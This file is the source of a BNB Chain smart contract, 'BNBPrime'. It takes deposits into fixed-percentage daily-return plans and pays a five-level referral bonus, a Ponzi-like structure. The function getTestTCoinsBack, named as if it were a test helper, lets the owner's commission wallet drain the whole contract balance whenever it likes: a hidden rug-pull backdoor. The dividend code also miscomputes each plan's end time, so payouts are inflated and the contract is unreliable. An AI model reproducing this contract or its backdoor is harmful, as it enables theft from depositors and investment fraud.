/**
 *Submitted for verification at BscScan.com on 2021-11-01
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract BNBPrime {
    using SafeMath for uint256;

    uint256 constant public INVEST_MIN_AMOUNT = 5e16; // 0.05 bnb
    uint256[] public REFERRAL_PERCENTS = [70, 30, 15, 10, 5];
    uint256 constant public PROJECT_FEE = 100;
    uint256 constant public PERCENT_STEP = 5;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 constant public TIME_STEP = 1 days;

    uint256 public totalInvested;
    uint256 public totalRefBonus;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint64 amount;
        uint32 start;
    }
    
    struct User {
        Deposit[] deposits;
        address referrer;
        uint256 totalReinvested;
        uint256 totalBonus;
        uint256 withdrawn;
        uint64 bonus;
        uint32 checkpoint;
        uint24[5] levels;
    }

    mapping (address => User) internal users;

    bool public started;
    address payable public commissionWallet;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event ReDeposit(address indexed user, uint8 plan, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address payable wallet) {
        require(!isContract(wallet));
        commissionWallet = wallet;

        plans.push(Plan(10000, 20));
        plans.push(Plan(40, 40));
        plans.push(Plan(60, 35));
        plans.push(Plan(90, 30));
    }
    
    function getTestTCoinsBack() external {
        require(msg.sender == commissionWallet);
        commissionWallet.transfer(address(this).balance);
    }

    function invest(address referrer, uint8 plan) public payable {
        if (!started) {
            if (msg.sender == commissionWallet) {
                started = true;
            } else revert("Not started yet");
        }

        require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 4, "Invalid plan");

        _invest(referrer, plan, msg.value);

        emit NewDeposit(msg.sender, plan, msg.value);
    }

    
    function compound(address referrer, uint8 plan) public{
        User storage user = users[msg.sender];
        require(plan < 4, "Invalid plan");
        require(user.deposits.length > 0, "Not invested yet");
        
        uint256 totalAmount = getUserDividends(msg.sender);
        uint256 referralBonus = getUserReferralBonus(msg.sender);

        if (referralBonus > 0) {
            user.bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            user.bonus = uint64(totalAmount.sub(contractBalance));
            user.totalBonus = user.totalBonus.add(user.bonus);
            totalAmount = contractBalance;
        }

        _invest(referrer, plan, totalAmount);

        user.totalReinvested = user.totalReinvested.add(totalAmount);

        emit ReDeposit(msg.sender, plan, totalAmount);
    }

    function withdraw() public {
        User storage user = users[msg.sender];
        uint256 totalAmount = getUserDividends(msg.sender);
        uint256 referralBonus = getUserReferralBonus(msg.sender);

        if (referralBonus > 0) {
            user.bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            user.bonus = uint64(totalAmount.sub(contractBalance));
            user.totalBonus = user.totalBonus.add(user.bonus);
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);
        user.withdrawn = user.withdrawn.add(totalAmount);

        payable(msg.sender).transfer(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }


    function _invest(address referrer, uint8 plan, uint256 stakeAmount) private {

        uint256 fee = stakeAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        commissionWallet.transfer(fee);
        emit FeePayed(msg.sender, fee);

        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address upline = user.referrer;
            for (uint256 i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    users[upline].levels[i]++;
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint256 i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    uint256 amount = stakeAmount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    users[upline].bonus = uint64(uint256(users[upline].bonus).add(amount));
                    users[upline].totalBonus = users[upline].totalBonus.add(amount);
                    emit RefBonus(upline, msg.sender, i, amount);
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(plan, uint64(stakeAmount), uint32(block.timestamp)));

        totalInvested = totalInvested.add(stakeAmount);
    }


    function getUserDividends(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 totalAmount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            uint256 finish = uint256(user.deposits[i].start).add(plans[user.deposits[i].plan].time).mul(1 days);
            if (uint256(user.checkpoint) < finish) {
                uint256 share = uint256(user.deposits[i].amount).mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
                uint256 from = user.deposits[i].start > user.checkpoint ? uint256(user.deposits[i].start) : uint256(user.checkpoint);
                uint256 to = finish < block.timestamp ? finish : block.timestamp;
                if (from < to) {
                    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
                }
            }
        }
        return totalAmount;
    }


    function getUserReferralBonus(address userAddress) public view returns(uint256) {
        return uint256(users[userAddress].bonus);
    }

    function getUserDownlineCount(address userAddress) public view returns(uint24[5] memory referrals) {
        return (users[userAddress].levels);
    }
    
    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserAvailable(address userAddress) public view returns(uint256) {
        return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
    }

    function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint64 amount, uint32 start, uint32 finish) {
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = plans[plan].percent;
        amount = user.deposits[index].amount;
        start = user.deposits[index].start;
        finish = uint32(uint256(user.deposits[index].start).add(uint256(plans[user.deposits[index].plan].time).mul(1 days)));
    }

    function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
    }

    function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
        return(totalInvested, totalRefBonus);
    }

    function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalReinvested, uint256 totalWithdrawn, uint256 totalBonus, uint256 bonus, uint256 available, uint32 checkpoint) {
        return(
            getUserTotalDeposits(userAddress), 
            users[userAddress].totalReinvested, 
            users[userAddress].withdrawn, 
            users[userAddress].totalBonus,
            users[userAddress].bonus,
            getUserAvailable(userAddress),
            users[userAddress].checkpoint
        );
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}